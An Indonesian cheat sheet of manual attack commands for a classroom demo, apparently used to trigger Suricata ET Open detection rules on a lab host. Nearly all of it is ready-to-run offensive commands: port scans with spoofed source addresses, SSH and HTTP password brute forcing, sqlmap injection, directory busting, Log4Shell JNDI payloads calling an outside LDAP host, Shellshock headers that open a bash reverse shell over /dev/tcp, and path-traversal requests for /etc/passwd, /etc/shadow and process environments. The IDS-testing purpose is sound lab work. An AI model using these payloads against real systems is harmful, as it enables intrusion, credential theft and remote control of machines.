# 🔥 Cheat Sheet Serangan Manual — Demo Dosen
> Target: `192.168.216.128` | Interface: `eth0`
> Semua serangan terdeteksi oleh Suricata ET Open rules secara default.

---

## ⚙️ SETUP — jalankan 1x di awal

```bash
for i in 104 105 106 107 108 109 110; do sudo ip addr add 192.168.216.$i/24 dev eth0; done
```

---

## 1️⃣ Port Scan — nmap
**ET rule:** `ET SCAN Nmap Scripting Engine`

```bash
sudo nmap -S 192.168.216.101 -e eth0 -sV -sC -A -T4 -p 1-1000 192.168.216.128 -Pn
```

---

## 2️⃣ SSH Brute Force — hydra
**ET rule:** `ET SCAN LibSSH Based Frequent SSH Connections`

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.216.128 -t 4 -V -f
```
```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p password ssh://192.168.216.128 -t 4 -V
```

---

## 3️⃣ SQL Injection — sqlmap
**ET rule:** `ET WEB_SERVER Sqlmap SQL Injection Scan`

```bash
sqlmap -u "http://192.168.216.128/?id=1" --batch --level=3 --risk=2
```
```bash
sqlmap -u "http://192.168.216.128/?id=1" --dbs --batch
```
```bash
sqlmap -u "http://192.168.216.128/" --forms --batch --crawl=2
```

---

## 4️⃣ Web Directory Scan — gobuster
**ET rule:** `ET SCAN Go Buster Scan`

```bash
gobuster dir -u http://192.168.216.128 -w /usr/share/wordlists/dirb/common.txt -t 20
```
```bash
gobuster dir -u http://192.168.216.128 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

---

## 5️⃣ Log4Shell — CVE-2021-44228
**ET rule:** `ET EXPLOIT Apache log4j RCE Attempt`

```bash
curl --interface 192.168.216.104 -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/a}' http://192.168.216.128/
```
```bash
curl --interface 192.168.216.104 -H 'X-Api-Version: ${jndi:ldap://192.168.216.120:1389/a}' http://192.168.216.128/
```
```bash
curl --interface 192.168.216.104 -H 'X-Forwarded-For: ${jndi:ldap://192.168.216.120:1389/a}' http://192.168.216.128/
```
```bash
curl --interface 192.168.216.104 -H 'Authorization: ${jndi:ldap://192.168.216.120:1389/a}' http://192.168.216.128/
```
```bash
curl --interface 192.168.216.104 -H 'Cookie: session=${jndi:ldap://192.168.216.120:1389/a}' http://192.168.216.128/
```

---

## 6️⃣ Shellshock — CVE-2014-6271
**ET rule:** `ET WEB_SERVER Possible CVE-2014-6271 Attempt`

```bash
curl --interface 192.168.216.105 -H $'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/192.168.216.120/4444 0>&1' http://192.168.216.128/cgi-bin/test.cgi
```
```bash
curl --interface 192.168.216.105 -H $'Referer: () { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd' http://192.168.216.128/cgi-bin/admin
```
```bash
curl --interface 192.168.216.105 -H $'Cookie: () { ignored; }; /bin/bash -i >& /dev/tcp/192.168.216.120/4444 0>&1' http://192.168.216.128/cgi-bin/login
```

---

## 7️⃣ Web Vulnerability Scan — nikto
**ET rule:** `ET SCAN Nikto Web App Scan`

```bash
nikto -h http://192.168.216.128 -maxtime 60s -nointeractive
```
```bash
nikto -h http://192.168.216.128 -Tuning 1234 -maxtime 60s -nointeractive
```

---

## 8️⃣ HTTP Brute Force — hydra
**ET rule:** `ET SCAN Brute Force HTTP Auth`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.216.128/ -t 10 -V
```
```bash
hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt http-post-form://192.168.216.128/"/login:user=^USER^&pass=^PASS^:F=incorrect" -t 10 -V
```

---

## 9️⃣ LFI — curl path traversal
**ET rule:** `ET WEB_SERVER Possible LFI Attack`

```bash
curl --interface 192.168.216.106 "http://192.168.216.128/?file=../../../../etc/passwd"
```
```bash
curl --interface 192.168.216.106 "http://192.168.216.128/?page=../../../etc/shadow"
```
```bash
curl --interface 192.168.216.106 "http://192.168.216.128/?file=php://filter/convert.base64-encode/resource=/etc/passwd"
```
```bash
curl --interface 192.168.216.106 "http://192.168.216.128/?file=/proc/self/environ"
```
```bash
curl --interface 192.168.216.106 "http://192.168.216.128/?page=....//....//etc/passwd"
```

---

## 🔟 SYN Scan + OS Detection — nmap
**ET rule:** `ET SCAN Potential SSH Scan` / `ET SCAN Nmap`

```bash
sudo nmap -S 192.168.216.107 -e eth0 -sS -O --osscan-guess -T4 192.168.216.128 -Pn
```
```bash
sudo nmap -S 192.168.216.107 -e eth0 -sS -T4 -p 22,80,443,3306,8080 192.168.216.128 -Pn
```

---

## 🧹 CLEANUP — jalankan 1x di akhir

```bash
for i in 104 105 106 107 108 109 110; do sudo ip addr del 192.168.216.$i/24 dev eth0; done
```
